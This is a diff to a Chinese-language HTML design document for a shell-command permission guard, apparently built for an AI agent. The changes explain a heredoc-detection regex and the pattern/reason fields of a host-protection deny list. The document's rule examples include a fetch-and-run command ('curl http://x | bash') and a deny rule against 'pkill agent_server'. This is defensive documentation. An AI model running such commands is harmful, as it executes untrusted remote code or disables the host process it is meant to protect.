@@ -731,7 +731,7 @@ key = <span class="s">"group:&lt;g&gt;/bot:&lt;b&gt;/user:&lt;u&gt;"</span>
       <ul>
         <li><b>too_complex</b> — 结构不可信，不宜按普通命令拆分（以 AST 为准）。</li>
         <li><b>parse_unavailable</b> — 无可用 AST，且存在非纯重定向的风险特征。单独的 <code>&gt;</code> / <code>&lt;</code> 不触发（归 FileGuard）。</li>
-        <li><b>structure_guard</b> — heredoc / here-string。</li>
+        <li><b>structure_guard</b> — heredoc / here-string。保守扫描用正则 <code>&lt;&lt;&lt;?</code>（匹配 <code>&lt;&lt;</code> 或 <code>&lt;&lt;&lt;</code>）；有 tree-sitter 时看节点类型是否含 <code>heredoc</code>。</li>
         <li><b>interpreter_sink</b> — 管道下游为解释器。例：<code>curl http://x | bash</code>；<code>ls | wc -l</code> 不命中。</li>
         <li><b>compound_chain</b> — 原 builtin <code>shell_compound_chain</code>（已迁出规则包）。文本含 <code>;</code> <code>&amp;</code> <code>|</code> <code>${</code> 或换行等链式特征时抬档；tree-sitter 证明简单句则不抬。<strong>不能</strong>再用「同 tools+pattern 覆盖内置 action」；仅配 <code>guard_actions.compound_chain</code>（<code>allow</code> = 不抬）。</li>
       </ul>
@@ -1490,8 +1490,10 @@ flowchart TD
           <td class="k">host_guard.protected_patterns</td>
           <td>内置 6 条</td>
           <td>
-            元素 <code>{pattern, reason}</code>。缺省为产品名底线 6 条。
-            写出本键 = 只用你的列表做整段正则底线；段级点名等不受本键关闭。
+            元素 <code>{pattern, reason}</code>，二者均必填。
+            <code>pattern</code>：整段正则，命中则 DENY；
+            <code>reason</code>：命中后写入 <code>PermissionResult.reason</code> 的说明文案，不参与匹配。
+            缺省为产品名底线 6 条。写出本键 = 只用你的列表做整段正则底线；段级点名等不受本键关闭。
           </td>
         </tr>
         <tr>
@@ -1511,8 +1513,8 @@ flowchart TD
       <pre class="ex" style="margin-top:8px;font-size:11px"><span class="k">host_guard</span>:
   <span class="k">enabled</span>: <span class="n">true</span>
   <span class="k">protected_patterns</span>:                <span class="c"># 可选；缺省用内置产品名底线</span>
-    - <span class="k">pattern</span>: <span class="s">'\bpkill\b[^\n\r;|&amp;]*agent_server'</span>
-      <span class="k">reason</span>: <span class="s">blocked: pkill agent_server</span>
+    - <span class="k">pattern</span>: <span class="s">'\bpkill\b[^\n\r;|&amp;]*agent_server'</span>  <span class="c"># 匹配用</span>
+      <span class="k">reason</span>: <span class="s">blocked: pkill agent_server</span>   <span class="c"># 命中后写入 PermissionResult.reason</span>
 <span class="k">runtime</span>:                              <span class="c"># 宿主注入</span>
   <span class="k">protected_pids</span>: [<span class="s">"1234"</span>, <span class="s">"5678"</span>]
   <span class="k">project_root</span>: <span class="s">"/path/to/project"</span></pre>
